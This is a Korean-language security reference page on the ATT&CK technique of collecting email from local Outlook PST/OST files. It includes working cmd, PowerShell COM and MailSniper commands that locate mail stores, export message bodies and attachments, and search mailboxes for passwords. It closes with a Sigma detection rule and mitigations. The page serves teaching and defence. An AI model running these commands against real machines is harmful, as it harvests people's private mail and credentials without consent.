# T1114.001 — Local Email Collection

## 개요

**TA0009 / T1114.001**  
로컬 시스템에 저장된 PST/OST 파일이나 Outlook 클라이언트에서 이메일 데이터를 수집하는 기법입니다. 이메일에는 자격증명, 내부 문서, 비즈니스 기밀, 연락처 정보 등 고가치 데이터가 포함되어 있어 공격자의 주요 수집 대상입니다.

---

## 동작 방식

1. 로컬 파일 시스템에서 PST/OST 파일 위치 탐색
2. Outlook COM 오브젝트 또는 직접 파일 접근으로 이메일 내용 추출
3. 수집된 이메일 데이터를 아카이브하여 유출 준비
4. 이메일에서 자격증명, 내부 정보, 추가 피해자 파악

**주요 수집 대상:**
- `%USERPROFILE%\Documents\Outlook Files\*.pst`
- `%LOCALAPPDATA%\Microsoft\Outlook\*.ost`
- 웹 브라우저 캐시 (OWA 세션)
- Exchange 서버 메일박스 (원격)

---

## 주요 커맨드 / 실습

### PST/OST 파일 탐색
```cmd
# PST/OST 파일 위치 탐색
dir /s /b C:\*.pst 2>nul
dir /s /b C:\*.ost 2>nul

# 레지스트리에서 Outlook 프로파일 경로 확인
reg query "HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles" /s | findstr "001f6700"
```

```powershell
# PowerShell로 PST/OST 파일 검색
Get-ChildItem -Path C:\ -Recurse -Include "*.pst","*.ost" -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime
```

### PowerShell Outlook COM 오브젝트
```powershell
# Outlook COM을 통한 이메일 접근
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$inbox = $namespace.GetDefaultFolder(6)  # 6 = olFolderInbox

# 이메일 제목 및 발신자 수집
$inbox.Items | ForEach-Object {
    [PSCustomObject]@{
        Subject    = $_.Subject
        Sender     = $_.SenderEmailAddress
        ReceivedOn = $_.ReceivedTime
        Body       = $_.Body.Substring(0, [Math]::Min(200, $_.Body.Length))
    }
} | Export-Csv -Path C:\temp\emails.csv -NoTypeInformation

# 첨부파일 저장
$inbox.Items | Where-Object {$_.Attachments.Count -gt 0} | ForEach-Object {
    $_.Attachments | ForEach-Object {
        $_.SaveAsFile("C:\temp\attachments\$($_.FileName)")
    }
}
```

### MailSniper
```powershell
# OWA를 통한 이메일 검색
Invoke-SelfSearch -Mailbox user@corp.local -ExchHostname mail.corp.local -SearchTerm "password"

# EWS를 통한 이메일 수집
Get-GlobalAddressList -ExchHostname mail.corp.local -Username "user" -Password "pass" -OutFile gal.txt

# 첨부파일 다운로드
Invoke-AttachmentSearch -Mailbox user@corp.local -ExchHostname mail.corp.local -OutputCsv attachments.csv
```

## 탐지 방법

### Sigma Rule
```yaml
title: Suspicious PST/OST File Access
id: d3e8b5c1-7a4f-4e2b-9c6d-3f1e8b5a2c4d
status: stable
description: Detects access to Outlook PST/OST files by processes other than Outlook
logsource:
    product: windows
    category: file_access
detection:
    selection:
        TargetFilename|endswith:
            - '.pst'
            - '.ost'
    filter:
        Image|endswith:
            - '\OUTLOOK.EXE'
            - '\MsMpEng.exe'
    condition: selection and not filter
falsepositives:
    - Backup software (Veeam, Acronis, etc.)
    - Exchange migration tools
level: high
tags:
    - attack.collection
    - attack.t1114.001
```

## 대응 방안

1. PST 파일 로컬 저장 비활성화 정책 (GPO)
2. 파일 시스템 감사로 PST/OST 파일 접근 이벤트 수집
3. DLP(Data Loss Prevention) 솔루션으로 이메일 데이터 유출 방지
4. Exchange/O365 이상 접근 패턴 모니터링
5. 이메일 암호화 적용 (S/MIME, PGP)
